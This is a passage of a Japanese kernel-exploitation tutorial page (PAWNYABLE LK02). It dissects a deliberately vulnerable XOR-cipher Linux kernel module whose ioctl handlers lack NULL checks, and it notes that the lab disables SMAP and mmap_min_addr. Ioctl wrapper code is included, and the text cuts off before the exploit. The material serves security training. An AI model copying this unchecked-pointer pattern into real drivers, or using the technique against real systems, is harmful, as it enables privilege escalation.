@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+
+
+
+
+
+<title>NULL Pointer Dereference | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline-flex;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+            
+                NULL Pointer Dereference
+            
+            
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK01/race_condition.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="../LK03/double_fetch.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>Kernel Exploitに必要な知識のほとんどはLK01で既に説明が完了しているので、ここからはカーネル空間特有の攻撃手法やLinuxカーネルに搭載された機能に対する攻撃などの細かい内容になります。<br>
+LK02(Angus)ではカーネル空間におけるNULL Pointer Dereferenceの悪用方法について学びます。まず<a href="distfiles/LK02.tar.gz">練習問題LK02</a>のファイルをダウンロードしてください。</p>
+<div class="column" title="目次">
+<!-- toc -->
+<ul>
+<li><a href="#%E6%9C%AC%E7%AB%A0%E3%81%A7%E6%89%B1%E3%81%86%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6">本章で扱う脆弱性について</a></li>
+<li><a href="#%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E7%A2%BA%E8%AA%8D">脆弱性の確認</a>
+<ul>
+<li><a href="#ioctl">ioctl</a></li>
+<li><a href="#file%E6%A7%8B%E9%80%A0%E4%BD%93">file構造体</a></li>
+<li><a href="#%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E6%A6%82%E8%A6%81">プログラムの概要</a></li>
+<li><a href="#%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E8%AA%BF%E6%9F%BB">脆弱性の調査</a></li>
+<li><a href="#%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E7%A2%BA%E8%AA%8D-1">脆弱性の確認</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BB%AE%E6%83%B3%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%A8mmap_min_addr">仮想メモリとmmap_min_addr</a></li>
+<li><a href="#%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC">権限昇格</a></li>
+</ul>
+<!-- tocstop -->
+<br>
+</div>
+<h2><span id="本章で扱う脆弱性について">本章で扱う脆弱性について</span></h2>
+<p>LK02のqemu起動オプションを見ると分かりますが、今回の攻撃対象のマシンではSMAPが無効になっています。本章で扱うNULL Pointer Dereferenceは、SMAPが無効でないとexploitできません。<br>
+また、今回のカーネルを起動して次のコマンドを入力してみてください。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/sys/vm/mmap_min_addr</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.17.1/source/security/min_addr.c#L8"><code>mmap_min_addr</code></a>はLinuxカーネルの変数で、名前の通りユーザーランドから<code>mmap</code>でマップできる最も小さいアドレスを制限します。デフォルトでは非ゼロの値ですが、今回の攻撃対象では0に設定されていることに注意してください。この変数は、今回扱うNULL Pointer Dereferenceに対するmitigationとしてLinuxカーネルのバージョン2.6.23から導入されました。</p>
+<p>このように、本章の内容はSMAPやmmapのmitigationが回避できる前提での攻撃になるため、最近のLinuxで使える手法にのみ興味がある方は読み飛ばしてもらって構いません。</p>
+<h2><span id="脆弱性の確認">脆弱性の確認</span></h2>
+<p>まずはLK02のソースコードを読んでみましょう。ソースコードは<code>src/angus.c</code>に書かれています。</p>
+<h3><span id="ioctl">ioctl</span></h3>
+<p>LK01と大きく違う点は、<code>read</code>,<code>write</code>が実装されていない代わりに<code>ioctl</code>というシステムコールのハンドラが記述されていることです。ファイルディスクリプタに対して<code>ioctl</code>を呼ぶことで、対応するカーネルやドライバ中の<code>ioctl</code>ハンドラが呼ばれます。<br>
+<code>ioctl</code>はファイルディスクリプタ以外に<code>request</code>, <code>argp</code>という2つの引数を取ります。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(fd, request, argp);</span><br></pre></td></tr></table></figure>
+<p><code>request</code>には、そのデバイスを操作するリクエストコードを渡します。リクエストコードはドライバが各自で定義した値なので、ソースコードを読んでどのようなリクエストを投げられるかを把握しましょう。<br>
+<code>argp</code>はそのデバイスに渡すデータを入れます。一般的にはここにはユーザー空間のデータのポインタが入り、カーネルモジュール側で<code>copy_from_user</code>を使ってリクエスト内容を読み出します。<br>
+今回のカーネルモジュールでも、<code>request_t</code>という構造体をユーザー空間から渡す仕様になっています。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *ptr;</span><br><span class="line">  <span class="keyword">size_t</span> len;</span><br><span class="line">&#125; <span class="keyword">request_t</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">module_ioctl</span><span class="params">(struct file *filp,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">                         <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req;</span><br><span class="line">  XorCipher *ctx;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(&amp;req, (<span class="keyword">void</span>*)arg, <span class="keyword">sizeof</span>(<span class="keyword">request_t</span>)))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure>
+<p>また、<code>request</code>のコードに応じて処理を変えている様子も確認できます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">  <span class="keyword">case</span> CMD_INIT:</span><br><span class="line">    <span class="keyword">if</span> (!ctx)</span><br><span class="line">      filp-&gt;private_data = (<span class="keyword">void</span>*)kzalloc(<span class="keyword">sizeof</span>(XorCipher), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!filp-&gt;private_data) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> CMD_SETKEY:</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">case</span> CMD_SETDATA:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p><code>ioctl</code>ハンドラの実装を読む前に、今回使われている<code>private_data</code>について説明します。</p>
+<h3><span id="file構造体">file構造体</span></h3>
+<p>ユーザー空間からドライバなどを操作するときファイルディスクリプタを使いますが、カーネル側では<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.17.1/source/include/linux/fs.h#L956"><code>file構造体</code></a>として受け取ります。<br>
+ファイル構造体には例えば<code>lseek</code>で設定されたカーソルの位置<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>などファイル固有の情報がありますが、カーネルモジュールが自由に使って良いメンバとして<code>private_data</code>があります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data;</span><br></pre></td></tr></table></figure>
+<p><code>private_data</code>にはどのようなデータを置いても構いませんが、データの確保や解放は当然モジュール側が正しく実装する必要があります。今回のドライバでは<code>XorCipher</code>という独自の構造体を格納するために使っています。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">module_open</span><span class="params">(struct inode *inode, struct file *filp)</span> </span>&#123;</span><br><span class="line">  filp-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">module_close</span><span class="params">(struct inode *inode, struct file *filp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (filp-&gt;private_data)</span><br><span class="line">    kfree(filp-&gt;private_data);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> CMD_INIT:</span><br><span class="line">      <span class="keyword">if</span> (!ctx)</span><br><span class="line">        filp-&gt;private_data = (<span class="keyword">void</span>*)kzalloc(<span class="keyword">sizeof</span>(XorCipher), GFP_KERNEL);</span><br><span class="line">      <span class="keyword">if</span> (!filp-&gt;private_data) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="オオカミくん"></div>
+  <p class="says">
+    LK01-4 (Holstein v4)でもここにデータを格納すれば競合が起きなかったね。
+  </p>
+</div>
+<h3><span id="プログラムの概要">プログラムの概要</span></h3>
+<p>このプログラムはデータをXOR暗号で暗号化・復号できるカーネルモジュールです。<br>
+このモジュールは<code>ioctl</code>で操作でき、リクエストコードは次の5つが用意されています。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_INIT    0x13370001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_SETKEY  0x13370002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_SETDATA 0x13370003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_GETDATA 0x13370004</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_ENCRYPT 0x13370005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_DECRYPT 0x13370006</span></span><br></pre></td></tr></table></figure>
+<p>まず<code>CMD_INIT</code>で呼び出すと<code>private_data</code>に<code>XorCipher</code>構造体が格納されます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *key;</span><br><span class="line">  <span class="keyword">char</span> *data;</span><br><span class="line">  <span class="keyword">size_t</span> keylen;</span><br><span class="line">  <span class="keyword">size_t</span> datalen;</span><br><span class="line">&#125; XorCipher;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">case</span> CMD_INIT:</span><br><span class="line">      <span class="keyword">if</span> (!ctx)</span><br><span class="line">        filp-&gt;private_data = (<span class="keyword">void</span>*)kzalloc(<span class="keyword">sizeof</span>(XorCipher), GFP_KERNEL);</span><br><span class="line">      <span class="keyword">if</span> (!filp-&gt;private_data) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p><code>XorCipher</code>構造体は鍵<code>key</code>とその長さ<code>keylen</code>、データ<code>data</code>とその長さ<code>datalen</code>を持ちます。</p>
+<p>次に<code>CMD_SETKEY</code>で呼び出すと、<code>argp</code>で渡されたデータを鍵としてコピーします。既に鍵が登録されている場合は先に古い鍵を解放します。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CMD_SETKEY:</span><br><span class="line">  <span class="keyword">if</span> (!ctx) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (!req.ptr || req.len &gt; <span class="number">0x1000</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (ctx-&gt;key) kfree(ctx-&gt;key);</span><br><span class="line">  <span class="keyword">if</span> (!(ctx-&gt;key = (<span class="keyword">char</span>*)kmalloc(req.len, GFP_KERNEL))) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(ctx-&gt;key, req.ptr, req.len)) &#123;</span><br><span class="line">    kfree(ctx-&gt;key);</span><br><span class="line">    ctx-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ctx-&gt;keylen = req.len;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>同様に<code>CMD_SETDATA</code>ではユーザー空間から暗号化・復号したいデータをコピーします。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CMD_SETDATA:</span><br><span class="line">  <span class="keyword">if</span> (!ctx) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (!req.ptr || req.len &gt; <span class="number">0x1000</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (ctx-&gt;data) kfree(ctx-&gt;data);</span><br><span class="line">  <span class="keyword">if</span> (!(ctx-&gt;data = (<span class="keyword">char</span>*)kmalloc(req.len, GFP_KERNEL))) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(ctx-&gt;data, req.ptr, req.len)) &#123;</span><br><span class="line">    kfree(ctx-&gt;key);</span><br><span class="line">    ctx-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ctx-&gt;datalen = req.len;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>暗号化・復号されたデータは<code>CMD_GETDATA</code>を使ってユーザー空間へコピーできます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CMD_GETDATA:</span><br><span class="line">  <span class="keyword">if</span> (!ctx-&gt;data) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (!req.ptr || req.len &gt; ctx-&gt;datalen) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (copy_to_user(req.ptr, ctx-&gt;data, req.len)) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>最後に<code>CMD_ENCRYPT</code>と<code>CMD_DECRYPT</code>では、<code>xor</code>関数を呼び出します。（XOR暗号なので暗号化も復号も同じアルゴリズムです。）データや鍵が設定されていない場合はエラーとなります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">xor</span><span class="params">(XorCipher *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!ctx-&gt;data || !ctx-&gt;key) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ctx-&gt;datalen; i++)</span><br><span class="line">    ctx-&gt;data[i] ^= ctx-&gt;key[i % ctx-&gt;keylen];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CMD_ENCRYPT:</span><br><span class="line">    <span class="keyword">case</span> CMD_DECRYPT:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">xor</span>(ctx);</span><br></pre></td></tr></table></figure>
+<h3><span id="脆弱性の調査">脆弱性の調査</span></h3>
+<p>今回のドライバにはバッファオーバーフローやUse-after-Freeといった脆弱性はありません。気づきにくいかもしれませんが、よく読むと暗号化・復号処理にNULL Pointer Dereferenceが存在します。<br>
+まず<code>ioctl</code>の最初に<code>private_data</code>のポインタを<code>XorCipher</code>として取得します。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx = (XorCipher*)filp-&gt;private_data;</span><br></pre></td></tr></table></figure>
+<p><code>CMD_SETKEY</code>などでは<code>private_data</code>が初期化済みかチェックされています。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx) <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure>
+<p>しかし、<code>CMD_GETDATA</code>,<code>CMD_ENCRYPT</code>,<code>CMD_DECRYPT</code>にはこのチェックがありません。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">xor</span><span class="params">(XorCipher *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!ctx-&gt;data || !ctx-&gt;key) <span class="keyword">return</span> -EINVAL; <span class="comment">// ctxのNULLチェックが無い</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ctx-&gt;datalen; i++)</span><br><span class="line">    ctx-&gt;data[i] ^= ctx-&gt;key[i % ctx-&gt;keylen];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">case</span> CMD_GETDATA:</span><br><span class="line">      <span class="keyword">if</span> (!ctx-&gt;data) <span class="keyword">return</span> -EINVAL; <span class="comment">// ctxのNULLチェックが無い</span></span><br><span class="line">      <span class="keyword">if</span> (!req.ptr || req.len &gt; ctx-&gt;datalen) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">      <span class="keyword">if</span> (copy_to_user(req.ptr, ctx-&gt;data, req.len)) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CMD_ENCRYPT:</span><br><span class="line">    <span class="keyword">case</span> CMD_DECRYPT:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">xor</span>(ctx);</span><br></pre></td></tr></table></figure>
+<p>したがって、データの取得や、暗号化・復号の際に未初期化の<code>XorCipher</code>（つまりNULLポインタ）を参照してしまう可能性があります。</p>
+<h3><span id="脆弱性の確認">脆弱性の確認</span></h3>
+<p>まずは正しい使い方でこのモジュールを呼び出してみます。各リクエストコードに対応する関数を作ると便利です。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">angus_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_INIT, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">angus_setkey</span><span class="params">(<span class="keyword">char</span> *key, <span class="keyword">size_t</span> keylen)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; .ptr = key, .len = keylen &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_SETKEY, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">angus_setdata</span><span class="params">(<span class="keyword">char</span> *data, <span class="keyword">size_t</span> datalen)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; .ptr = data, .len = datalen &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_SETDATA, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">angus_getdata</span><span class="params">(<span class="keyword">char</span> *data, <span class="keyword">size_t</span> datalen)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; .ptr = data, .len = datalen &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_GETDATA, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">angus_encrypt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_ENCRYPT, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">angus_decrypt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">request_t</span> req = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_ENCRYPT, &amp;req);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>例として、&quot;Hello, World!&quot;を&quot;ABC123&quot;という鍵で暗号化・復号してみましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/angus&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/angus&quot;</span>);</span><br><span class="line"></span><br><span class="line">  angus_init();</span><br><span class="line">  angus_setkey(<span class="string">&quot;ABC123&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  angus_setdata(<span class="string">&quot;Hello, World!&quot;</span>, <span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">  angus_encrypt();</span><br><span class="line">  angus_getdata(buf, <span class="number">13</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, buf[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  angus_decrypt();</span><br><span class="line">  angus_getdata(buf, <span class="number">13</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, buf[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span 